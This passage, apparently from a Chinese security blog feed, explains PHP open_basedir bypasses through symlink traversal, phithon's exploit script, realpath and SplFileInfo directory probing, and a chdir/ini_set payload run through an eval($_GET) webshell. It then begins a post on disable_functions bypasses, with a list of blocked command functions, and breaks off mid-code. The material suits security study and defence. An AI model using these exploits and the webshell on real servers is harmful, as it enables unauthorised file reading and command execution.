class="hljs-string">&quot;..&quot;</span>);<br>symlink(<span class="hljs-string">&quot;A/B/C/D&quot;</span>,<span class="hljs-string">&quot;SD&quot;</span>);<br>symlink(<span class="hljs-string">&quot;SD/../../../../etc/passwd&quot;</span>,<span class="hljs-string">&quot;POC&quot;</span>);<br>unlink(<span class="hljs-string">&quot;SD&quot;</span>);<br>mkdir(<span class="hljs-string">&quot;SD&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问web后,将会生成名为POC的文件<br><img src="/img/bypass_open_basedir/9.png"></p><p><img src="/img/bypass_open_basedir/10.png"></p><p>分析一下poc过程:</p><ol><li>创建A/B/C/D目录，并返回到起始目录</li><li><code>symlink(&quot;A/B/C/D&quot;,&quot;SD&quot;)</code>:创建符号文件SD,指向A/B/C/D</li><li><code>symlink(&quot;SD/../../../../etc/passwd&quot;,&quot;POC&quot;)</code>:创建符号文件POC,指向<code>SD/../../../../etc/passwd</code>。此时SD=A/B/C/D,而<code>A/B/C/D../../../../</code>=<code>/var/www/html</code>,符合open_basedir的限制,创建成功。</li><li>unlink(“SD”):删除软链接SD，并创建一个文件夹,此时SD作为一个真正的目录存在。那么访问POC,指向的是<code>SD/../../../../etc/passwd</code>,<code>SD/../../../</code>就是/var目录,<code>/var/../etc/passwd</code>恰好可以读取到etc目录下的passwd，从而达到跨目录访问的效果。</li></ol><p>这里需要跨几层目录就需要创建几层目录。</p><p>最后附上p牛EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/* * by phithon * From https://www.leavesongs.com * detail: http://cxsecurity.com/issue/WLB-2009110068 */</span><br>header(<span class="hljs-string">&#x27;content-type: text/plain&#x27;</span>);<br>error_reporting(-<span class="hljs-number">1</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-literal">TRUE</span>);<br>printf(<span class="hljs-string">&quot;open_basedir: %s\nphp_version: %s\n&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>), phpversion());<br>printf(<span class="hljs-string">&quot;disable_functions: %s\n&quot;</span>, ini_get(<span class="hljs-string">&#x27;disable_functions&#x27;</span>));<br><span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ? <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-variable">$relat_file</span> = getRelativePath(<span class="hljs-keyword">__FILE__</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-variable">$paths</span> = explode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-variable">$name</span> = mt_rand() % <span class="hljs-number">999</span>;<br><span class="hljs-variable">$exp</span> = getRandStr();<br>mkdir(<span class="hljs-variable">$name</span>);<br>chdir(<span class="hljs-variable">$name</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span> ; <span class="hljs-variable">$i</span> &lt; count(<span class="hljs-variable">$paths</span>) - <span class="hljs-number">1</span> ; <span class="hljs-variable">$i</span>++)&#123;<br>    mkdir(<span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>]);<br>    chdir(<span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>]);<br>&#125;<br>mkdir(<span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> -= <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &gt; <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>--) &#123; <br>    chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$paths</span> = explode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$relat_file</span>);<br><span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-string">&#x27;..&#x27;</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    mkdir(<span class="hljs-variable">$name</span>);<br>    chdir(<span class="hljs-variable">$name</span>);<br>    <span class="hljs-variable">$j</span>++;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-variable">$j</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$tmp</span> = array_fill(<span class="hljs-number">0</span>, <span class="hljs-variable">$j</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$name</span>);<br>symlink(implode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$tmp</span>), <span class="hljs-string">&#x27;tmplink&#x27;</span>);<br><span class="hljs-variable">$tmp</span> = array_fill(<span class="hljs-number">0</span>, <span class="hljs-variable">$j</span>, <span class="hljs-string">&#x27;..&#x27;</span>);<br>symlink(<span class="hljs-string">&#x27;tmplink/&#x27;</span> . implode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$tmp</span>) . <span class="hljs-variable">$file</span>, <span class="hljs-variable">$exp</span>);<br>unlink(<span class="hljs-string">&#x27;tmplink&#x27;</span>);<br>mkdir(<span class="hljs-string">&#x27;tmplink&#x27;</span>);<br>delfile(<span class="hljs-variable">$name</span>);<br><span class="hljs-variable">$exp</span> = dirname(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>]) . <span class="hljs-string">&quot;/<span class="hljs-subst">&#123;$exp&#125;</span>&quot;</span>;<br><span class="hljs-variable">$exp</span> = <span class="hljs-string">&quot;http://<span class="hljs-subst">&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;</span><span class="hljs-subst">&#123;$exp&#125;</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n-----------------content---------------\n\n&quot;</span>;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$exp</span>);<br>delfile(<span class="hljs-string">&#x27;tmplink&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRelativePath</span>(<span class="hljs-params"><span class="hljs-variable">$from</span>, <span class="hljs-variable">$to</span></span>) </span>&#123;<br>  <span class="hljs-comment">// some compatibility fixes for Windows paths</span><br>  <span class="hljs-variable">$from</span> = rtrim(<span class="hljs-variable">$from</span>, <span class="hljs-string">&#x27;\/&#x27;</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>  <span class="hljs-variable">$from</span> = str_replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$from</span>);<br>  <span class="hljs-variable">$to</span>   = str_replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$to</span>);<br><br>  <span class="hljs-variable">$from</span>   = explode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$from</span>);<br>  <span class="hljs-variable">$to</span>     = explode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$to</span>);<br>  <span class="hljs-variable">$relPath</span>  = <span class="hljs-variable">$to</span>;<br><br>  <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$from</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$depth</span> =&gt; <span class="hljs-variable">$dir</span>) &#123;<br>    <span class="hljs-comment">// find first non-matching dir</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-variable">$to</span>[<span class="hljs-variable">$depth</span>]) &#123;<br>      <span class="hljs-comment">// ignore this directory</span><br>      array_shift(<span class="hljs-variable">$relPath</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// get number of remaining dirs to $from</span><br>      <span class="hljs-variable">$remaining</span> = count(<span class="hljs-variable">$from</span>) - <span class="hljs-variable">$depth</span>;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$remaining</span> &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// add traversals up to first matching dir</span><br>        <span class="hljs-variable">$padLength</span> = (count(<span class="hljs-variable">$relPath</span>) + <span class="hljs-variable">$remaining</span> - <span class="hljs-number">1</span>) * -<span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$relPath</span> = array_pad(<span class="hljs-variable">$relPath</span>, <span class="hljs-variable">$padLength</span>, <span class="hljs-string">&#x27;..&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$relPath</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;./&#x27;</span> . <span class="hljs-variable">$relPath</span>[<span class="hljs-number">0</span>];<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> implode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$relPath</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delfile</span>(<span class="hljs-params"><span class="hljs-variable">$deldir</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (@is_file(<span class="hljs-variable">$deldir</span>)) &#123;<br>        @chmod(<span class="hljs-variable">$deldir</span>,<span class="hljs-number">0777</span>);<br>        <span class="hljs-keyword">return</span> @unlink(<span class="hljs-variable">$deldir</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(@is_dir(<span class="hljs-variable">$deldir</span>))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-variable">$mydir</span> = @opendir(<span class="hljs-variable">$deldir</span>)) == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">false</span> !== (<span class="hljs-variable">$file</span> = @readdir(<span class="hljs-variable">$mydir</span>)))<br>        &#123;<br>            <span class="hljs-variable">$name</span> = File_Str(<span class="hljs-variable">$deldir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file</span>);<br>            <span class="hljs-keyword">if</span>((<span class="hljs-variable">$file</span>!=<span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp; (<span class="hljs-variable">$file</span>!=<span class="hljs-string">&#x27;..&#x27;</span>))&#123;delfile(<span class="hljs-variable">$name</span>);&#125;<br>        &#125; <br>        @closedir(<span class="hljs-variable">$mydir</span>);<br>        @chmod(<span class="hljs-variable">$deldir</span>,<span class="hljs-number">0777</span>);<br>        <span class="hljs-keyword">return</span> @rmdir(<span class="hljs-variable">$deldir</span>) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">File_Str</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;//&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,str_replace(<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-variable">$string</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRandStr</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">6</span></span>) </span>&#123;<br>    <span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$randStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$randStr</span> .= substr(<span class="hljs-variable">$chars</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$chars</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randStr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="利用bindtextdomain和SplFileInfo方法"><a href="#利用bindtextdomain和SplFileInfo方法" class="headerlink" title="利用bindtextdomain和SplFileInfo方法"></a>利用bindtextdomain和SplFileInfo方法</h2><p>bindtextdomain设置或获取域名的路径，函数原型为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">bindtextdomain(<span class="hljs-keyword">string</span> <span class="hljs-variable">$domain</span>, ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$directory</span>): <span class="hljs-keyword">string</span>|<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>利用原理是基于报错：<code>bindtextdomain()</code>函数的第二个参数$directory是一个文件路径，它会在$directory存在的时候返回$directory，不存在则返回false。<br><code>SplFileInfo</code>函数类似。<br>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$re</span> = bindtextdomain(<span class="hljs-string">&#x27;xxx&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>]);<br>var_dump(<span class="hljs-variable">$re</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileInfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>]);<br>var_dump(<span class="hljs-variable">$info</span>-&gt;getRealPath());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果成功访问到存在的文件是会返回该文件路径：<br><img src="/img/bypass_open_basedir/12.png"></p><p>而如果访问到不存在的文件就会返回<code>false</code><br><img src="/img/bypass_open_basedir/13.png"></p><p>这个方法感觉非常鸡肋,用起来比较恶心，最好与其他方法组合使用。</p><h2 id="利用SplFileInfo-getRealPath-方法"><a href="#利用SplFileInfo-getRealPath-方法" class="headerlink" title="利用SplFileInfo::getRealPath()方法"></a>利用SplFileInfo::getRealPath()方法</h2><p>(PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)<br>SplFileInfo类为单个文件的信息提供了一个高级的面向对象的接口。<br>而其中<code>getRealPath()</code>用于获取文件的绝对路径。bypass原理同样是基于报错，该方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了open_basedir的设定。</p><p>脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));<br>printf(<span class="hljs-string">&quot;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$basedir</span> = <span class="hljs-string">&#x27;D:/CSGO/&#x27;</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$info</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileInfo</span>(<span class="hljs-variable">$basedir</span> . <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$i</span>] . <span class="hljs-string">&#x27;&lt;&lt;&#x27;</span>);<br>    <span class="hljs-variable">$re</span> = <span class="hljs-variable">$info</span>-&gt;getRealPath();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$re</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$re</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/bypass_open_basedir/14.png"></p><h2 id="利用realpath列目录"><a href="#利用realpath列目录" class="headerlink" title="利用realpath列目录"></a>利用realpath列目录</h2><p>环境要求:Windows</p><p>realpath()返回规范化的绝对路径名,它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">realpath(<span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span>): <span class="hljs-keyword">string</span>|<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>bypass原理:<br>与上面说到的两种方式类似。在开启了open_basedir的情况下，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在open_basedir里的文件的话，他就会返回<code>file is not within the allowed path(s)</code>，有点像盲注,基于报错来判断文件名。</p><p>脚本入下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));<br>printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br>set_error_handler(<span class="hljs-string">&#x27;isexists&#x27;</span>);<br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;D:/5E/5EClient/&#x27;</span>;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$dir</span> . <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$i</span>] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;<br>        realpath(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/File\((.*)\) is not within/&#x27;</span>;<br>        preg_match(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$matches</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>])) &#123;<br>                printf(<span class="hljs-string">&quot;%s &lt;br/&gt;&quot;</span>, <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]);<br>        &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/bypass_open_basedir/11.png"></p><h2 id="利用chdir与ini-set"><a href="#利用chdir与ini-set" class="headerlink" title="利用chdir与ini_set"></a>利用chdir与ini_set</h2><p><code>chdir</code>将工作目录切换到指定的目录,函数原型为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">chdir(<span class="hljs-keyword">string</span> <span class="hljs-variable">$directory</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p><code>ini_set</code>i用来设置php.ini的值，无需打开php.ini文件，就能修改配置。函数原型为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ini_set(<span class="hljs-keyword">string</span> <span class="hljs-variable">$option</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$value</span>): <span class="hljs-keyword">string</span>|<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p><p>bypass原理大概open_basedir设计逻辑的安全问题<br>分析过程参考:<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">从PHP底层看open_basedir bypass</a></p><p>一个小demo，将该文件放到网站目录下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;open_basedir: &#x27;</span>.ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;GET: &#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;open_basedir: &#x27;</span>.ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mkdir(<span class="hljs-string">&#x27;sub&#x27;</span>);chdir(<span class="hljs-string">&#x27;sub&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/bypass_open_basedir/15.png"><br>open_basedir被设置成了’&#39;,失去原有的限制。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">浅谈几种Bypass open_basedir的方法</a><br><a href="http://diego.team/2020/07/28/PHP-bypass-open_basedir/">PHP bypass open_basedir</a><br><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html">php5全版本绕过open_basedir读文件脚本</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>浅析Bypass disable_functions</title>
    <link href="/2021/08/05/bypass_disable_function/"/>
    <url>/2021/08/05/bypass_disable_function/</url>
    
    <content type="html"><![CDATA[<h2 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h2><p>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。</p><p><img src="/img/bypass_disable_function/1.png"></p><p>比如拿到一个webshell,用管理工具去连接,执行命令发现<code>ret=127</code>,实际上就是因为被这个限制的原因</p><p><img src="/img/bypass_disable_function/2.png"></p><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open<br></code></pre></td></tr></table></figure><p>观察php.ini 中的 disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可。</p><h2 id="利用Windows组件COM绕过"><a href="#利用Windows组件COM绕过" class="headerlink" title="利用Windows组件COM绕过"></a>利用Windows组件COM绕过</h2><p>查看<code>com.allow_dcom</code>是否开启,这个默认是不开启的。<br><img src="/img/bypass_disable_function/3.png"></p><p>创建一个COM对象,通过调用COM对象的<code>exec</code>替我们执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 